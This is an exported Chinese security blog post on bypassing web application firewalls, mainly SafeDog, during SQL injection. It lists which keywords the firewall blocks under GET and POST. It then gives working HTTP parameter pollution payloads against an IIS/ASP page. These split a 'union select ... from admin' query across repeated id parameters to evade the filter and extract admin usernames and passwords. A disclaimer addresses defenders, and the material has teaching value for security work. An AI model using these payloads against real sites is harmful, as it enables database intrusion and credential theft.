{"title":"WAF安全拦截绕过思路和手法","slug":"网安防御/应用服务安全和防御/WAF安全拦截绕过思路和手法","date":"2019-09-10T06:34:30.000Z","updated":"2023-01-31T02:29:10.643Z","url":"2019/9-10-445.html","path":"api/articles/2019/9-10-445.html.json","covers":["https://img.weiyigeek.top/2019/1/20190924141908.png","https://img.weiyigeek.top/2019/1/20190924142628.png"],"content":"<p>[TOC]</p>\n<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。</b></p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-介绍前言\"><a href=\"#0x00-介绍前言\" class=\"headerlink\" title=\"0x00 介绍前言\"></a>0x00 介绍前言</h4><p>收集之中</p>\n<p>WAF绕过方法:</p>\n<ul>\n<li>HPP(参数污染)方式</li>\n</ul>\n<p>判断注入:<br>xor 可直接过大部分的防护(包括安全狗)<br>order by 大部分WAF默认拦截(包括安全狗)<br>union 不拦截<br>select 不拦截<br>union selec 不拦截<br>union select 拦截<br>注:以上是在GET方式下的结果</p>\n<p>POST下:<br>and 不拦截<br>union select 不拦截<br>底线为↓<br>union select 1,2 from 这里开始被拦截<br>实际上真正要绕过的是from是否被匹配</p>\n<h4 id=\"安全狗WAF\"><a href=\"#安全狗WAF\" class=\"headerlink\" title=\"安全狗WAF\"></a>安全狗WAF</h4><h5 id=\"ByPass之HPP应用\"><a href=\"#ByPass之HPP应用\" class=\"headerlink\" title=\"ByPass之HPP应用\"></a>ByPass之HPP应用</h5><p>描述:</p>\n<p>一个有趣的注入点(可以使用其绕过SafeDog)<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#正常访问</span></span><br><span class=\"line\">http://192.168.1.170/Production/PRODUCT_DETAIL.asp?id=1137</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#HPP参数污染#且参数一为113 参数二为7 </span></span><br><span class=\"line\">http://192.168.1.170/Production/PRODUCT_DETAIL.asp?id=113&amp;id=7 <span class=\"comment\">#回显的结果为id=113, 7</span></span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190924141908.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>结论:由HPP原理思路可知IIS/ASP解析同名参数同时传递的时候会将其进行采用”,”拼接分割;</p>\n<p>我们继续深入学习:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#我们构造下面的PoC由于&amp;id=x相当于 ,x 所以参数值的数字都会变成,数字(用post测试)</span></span><br><span class=\"line\">id=1137 union select 1&amp;id=2&amp;id=3&amp;id=4&amp;id=5&amp;id=6&amp;id=7&amp;id=8&amp;id=9&amp;id=10&amp;id=11&amp;id=12&amp;id=13&amp;id=14&amp;id=15&amp;id=16&amp;id=17&amp;id=18&amp;id=19&amp;id=20&amp;id=21&amp;id=22%20from%20admin</span><br><span class=\"line\"><span class=\"comment\">#利用union爆出显位字段 3 , 15</span></span><br></pre></td></tr></table></figure><br>继续注入查账号密码<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1137%20union%20select%201&amp;id=2&amp;id=admin&amp;id=4&amp;id=5&amp;id=6&amp;id=7&amp;id=8&amp;id=9&amp;id=10&amp;id=11&amp;id=12&amp;id=13&amp;id=14&amp;id=password&amp;id=16&amp;id=17&amp;id=18&amp;id=19&amp;id=20&amp;id=21&amp;id=22%20from%20admin</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190924142628.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n","comments":true,"excerpt":"[TOC]注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。","categories":[{"name":"SecurityManager","path":"api/categories/SecurityManager.json"}],"tags":[{"name":"WAF","path":"api/tags/WAF.json"}]}